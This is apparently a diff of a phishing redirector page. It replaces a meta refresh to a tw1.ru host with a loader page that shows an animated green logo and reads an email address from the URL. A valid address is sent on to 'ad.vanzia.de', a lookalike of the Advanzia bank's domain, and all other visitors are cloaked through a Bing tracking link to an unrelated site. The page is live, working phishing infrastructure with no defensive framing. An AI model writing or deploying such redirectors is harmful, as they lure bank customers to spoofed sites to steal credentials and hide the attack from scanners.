@@ -1,1 +1,127 @@
-<meta http-equiv="refresh" content="0; URL=https://co77230.tw1.ru/privacy.html?em=support@advanzia.de" />
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+		
+		@keyframes scale-to-full {
+  0%, 1% {
+    transform: scale(0);
+  }
+  70%, 100% {
+    transform: scale(1);
+  }
+}
+@keyframes show-bars {
+  0%, 30% {
+    opacity: 0;
+    transform: scaley(0.78);
+  }
+  70%, 92.8% {
+    opacity: 1;
+    transform: scaley(1);
+  }
+  93%, 100% {
+    opacity: 0;
+    transform: scaley(0.78);
+  }
+}
+@keyframes dash {
+  0% {
+    fill-opacity: 0;
+    stroke-width: 1px;
+  }
+  37% {
+    fill-opacity: 0;
+  }
+  50% {
+    stroke-width: 1px;
+  }
+  100% {
+    fill-opacity: 1;
+    stroke-dashoffset: 0;
+    stroke-width: 0;
+  }
+}
+#wrapper {
+  align-items: center;
+  display: flex;
+  height: 100vh;
+  justify-content: center;
+  width: 100vw;
+}
+#wrapper svg {
+  height: 30vh;
+  max-width: 90vw;
+  width: auto;
+}
+
+#logo--circle {
+  animation: dash 4s infinite, scale-to-full 4s infinite;
+  fill: #1ED760;
+  stroke: #1ED760;
+  stroke-dasharray: 90;
+  stroke-dashoffset: 90;
+  transform-origin: 84px 50%;
+  transition: fill-opacity 0.3s ease, transform 0.1s ease;
+}
+#logo--circle .logo--circle--bar {
+  animation: show-bars 4s infinite;
+  fill: white;
+  opacity: 0;
+  transform: scaley(0.78);
+  transition: opacity 0.3s ease, transform 0.3s ease;
+}
+#logo--circle #logo--circle--bar-1 {
+  animation-delay: 0.25s;
+}
+#logo--circle #logo--circle--bar-2 {
+  animation-delay: 0.7s;
+}
+#logo--circle #logo--circle--bar-3 {
+  animation-delay: 1s;
+}
+
+#logo--name path {
+  animation: dash 4s infinite;
+  fill: #1ED760;
+  stroke: #1ED760;
+  stroke-dasharray: 600;
+  stroke-dashoffset: 600;
+  transition: fill-opacity 0.3s ease;
+}
+
+    </style>
+		<title>️</title>
+	<script type="text/javascript">
+	window.$_GET = location.search.substr(1).split("&").reduce((o,i)=>(u=decodeURIComponent,[k,v]=i.split("="),o[u(k)]=v&&u(v),o),{});
+	function ValidateEmail(mail) 
+		{
+		 if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail))
+			return (true)
+			return false
+		}
+	if(ValidateEmail($_GET['em'])){
+		document.write('<meta http-equiv="refresh" content="0; url=https://www.ad.vanzia.de/index.php?em='+$_GET['em']+'">');
+	}else{
+		document.write('<meta http-equiv="refresh" content="0; url=https://www.bing.com/ck/a?!&&p=09744097a926089bJmltdHM9MTcwMTQ3NTIwMCZpZ3VpZD0yYWNlNWMyYi04MTNiLTY1MzAtMWJhOS00ZmZhODA2YzY0OTUmaW5zaWQ9NTE2Ng&ptn=3&ver=2&hsh=3&fclid=2ace5c2b-813b-6530-1ba9-4ffa806c6495&u=a1aHR0cHM6Ly9iYXJiZXJzaG9wLm1hL2VuLw&ntb=1">');
+	}
+</script>
+</head>
+<body>
+	
+	<div id="wrapper">
+
+</div>
+</body>
+</html>
+
